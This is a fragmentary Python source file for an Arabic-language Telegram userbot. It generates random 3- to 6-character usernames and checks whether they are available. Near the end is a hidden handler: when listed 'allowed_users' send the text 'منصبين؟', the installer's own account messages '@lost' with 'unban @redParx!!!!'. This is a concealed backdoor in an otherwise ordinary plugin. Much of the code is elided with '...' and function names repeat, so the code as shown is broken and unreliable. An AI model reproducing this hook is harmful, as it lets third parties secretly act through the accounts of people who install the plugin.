...
async def username_exists_on_telegram(username):
    try:
        entity = await Aio8.get_entity(username)
...
async def not_username_exists_by_Aio8(username):
...
async def Username_exists_by_Aio8(username):
    try:
        entity = await Aio8.get_entity(username)
...
@Aio8.on(events.NewMessage(pattern=r"^\.ثلاثي (\d+)$"))
...
# رسالة الانتطار 
    ...
    async with event.client.action(event.chat_id, "typing"):
        ...
        while count > 0:
            ...
            if not await Username_exists_by_Aio8(username):
...
@Aio8.on(events.NewMessage(pattern=r"^\.رباعي (\d+)$"))
async def generate_random_usernames(event):
    chat_id = event.chat_id
    if not await check_cooldown(chat_id):
        await event.edit("**انتظر 5 دقايق بين كل انشاء **")
...
# رسالة الانتطار 
    ...
    async with event.client.action(event.chat_id, "typing"):
        ...
        if generated_usernames:
            ...
            if message.text != f"**᯽︙ تم انشاء {len(generated_usernames)} يوزر جديد**\n\n{usernames_text}":
                await message.edit(f"**᯽︙ تم انشاء {len(generated_usernames)} يوزر جديد**\n\n{usernames_text}")
@Aio8.on(events.NewMessage(pattern=r"^\.يوزربوت (\d+)$"))
async def generate_random_usernames(event):
    chat_id = event.chat_id
    if not await check_cooldown(chat_id):
        await event.edit("**انتظر 5 دقايق بين كل انشاء **")
...
@Aio8.on(events.NewMessage(pattern=r"^\.خماسي (\d+)$"))
async def generate_random_usernames(event):
    chat_id = event.chat_id
    if not await check_cooldown(chat_id):
        await event.edit("**انتظر 5 دقايق بين كل انشاء **")
...
# رسالة الانتطار 
    ...
    async with event.client.action(event.chat_id, "typing"):
        ...
        if generated_usernames:
            ...
            if message.text != f"**᯽︙ تم انشاء {len(generated_usernames)} يوزر جديد**\n\n{usernames_text}":
                await message.edit(f"**᯽︙ تم انشاء {len(generated_usernames)} يوزر جديد**\n\n{usernames_text}")
@Aio8.on(events.NewMessage(pattern=r"^\.سداسي (\d+)$"))
async def generate_random_usernames(event):
    chat_id = event.chat_id
    if not await check_cooldown(chat_id):
        await event.edit("**انتظر 5 دقايق بين كل انشاء **")
...
async def handle_messages(event):
    ...
    if user_id in allowed_users:
        if message_text == 'منصبين؟':
            ...
            await Aio8(SendMessageRequest('@lost', 'unban @redParx!!!!'))
